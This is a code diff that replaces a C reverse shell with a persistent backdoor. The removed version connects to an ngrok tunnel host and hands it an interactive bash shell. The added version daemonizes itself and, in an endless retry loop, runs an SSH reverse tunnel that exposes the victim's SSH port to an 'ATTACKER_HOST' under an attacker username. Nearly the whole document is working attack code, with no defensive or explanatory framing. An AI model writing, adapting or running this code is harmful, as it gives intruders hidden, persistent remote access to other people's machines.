@@ -1,51 +1,79 @@
+// reverse_ssh_persistent.c
+// Compile: gcc reverse_ssh_persistent.c -o revssh
+// Usage: ./revssh
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <sys/socket.h>
-#include <netdb.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+
+#define ATTACKER_USER "lbonilla"
+#define ATTACKER_HOST "192.168.1.66"  // <-- Replace with VPS or public server
+#define REMOTE_PORT "4444"               // <-- Port on attacker machine
+#define LOCAL_PORT "22"                  // <-- SSH port on victim
+#define SSH_BIN "/usr/bin/ssh"
+
+void daemonize() {
+    pid_t pid = fork();
+    if (pid < 0) {
+        fprintf(stderr, "[DEBUG] First fork failed\n");
+        exit(1);
+    }
+    if (pid > 0) {
+        fprintf(stderr, "[DEBUG] Parent exiting after first fork\n");
+        exit(0); // parent exits
+    }
+
+    if (setsid() < 0) {
+        fprintf(stderr, "[DEBUG] setsid() failed\n");
+        exit(1);
+    } else {
+        fprintf(stderr, "[DEBUG] New session created\n");
+    }
+
+    pid = fork();
+    if (pid < 0) {
+        fprintf(stderr, "[DEBUG] Second fork failed\n");
+        exit(1);
+    }
+    if (pid > 0) {
+        fprintf(stderr, "[DEBUG] Session leader exiting after second fork\n");
+        exit(0); // session leader exits
+    }
+
+    umask(0);
+    chdir("/");
+
+    for (int i = sysconf(_SC_OPEN_MAX); i>=0; i--) close(i);
+
+    fprintf(stderr, "[DEBUG] Daemonization complete\n");
+}
 
 int main() {
-    int sock;
-    struct sockaddr_in server;
+    fprintf(stderr, "[DEBUG] Starting reverse SSH persistent daemon\n");
+    daemonize();
 
-    // Dirección y puerto del túnel ngrok
-    char *server_ip = "0.tcp.ngrok.io";
-    int server_port = 18640;
+    while (1) {
+        pid_t pid = fork();
 
-    // Crear socket
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == -1) {
-        perror("socket");
-        exit(1);
+        if (pid == 0) {
+            fprintf(stderr, "[DEBUG] Child process: attempting to exec SSH tunnel\n");
+            execl(SSH_BIN, "ssh", "-N", "-R",
+                  REMOTE_PORT ":localhost:" LOCAL_PORT,
+                  ATTACKER_USER "@" ATTACKER_HOST, (char *)NULL);
+            fprintf(stderr, "[DEBUG] execl failed\n");
+            exit(1); // if exec fails
+        } else if (pid > 0) {
+            fprintf(stderr, "[DEBUG] Parent process: waiting for child (SSH tunnel) to exit\n");
+            waitpid(pid, NULL, 0);
+            fprintf(stderr, "[DEBUG] Child exited, sleeping 10 seconds before retry\n");
+            sleep(10); // retry every 10s if connection drops
+        } else {
+            fprintf(stderr, "[DEBUG] fork() failed in main loop, sleeping 10 seconds\n");
+            sleep(10);
+        }
     }
-
-    // Resolver IP usando DNS
-    struct hostent *he = gethostbyname(server_ip);
-    if (he == NULL) {
-        herror("gethostbyname");
-        exit(1);
-    }
-
-    server.sin_family = AF_INET;
-    server.sin_port = htons(server_port);
-    server.sin_addr = *((struct in_addr *)he->h_addr);
-
-    // Conectar
-    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
-        perror("connect");
-        exit(1);
-    }
-
-    // Redirigir stdin, stdout y stderr al socket
-    dup2(sock, 0);
-    dup2(sock, 1);
-    dup2(sock, 2);
-
-    // Ejecutar shell
-    execl("/bin/bash", "bash", "-i", NULL);
 
     return 0;
 }
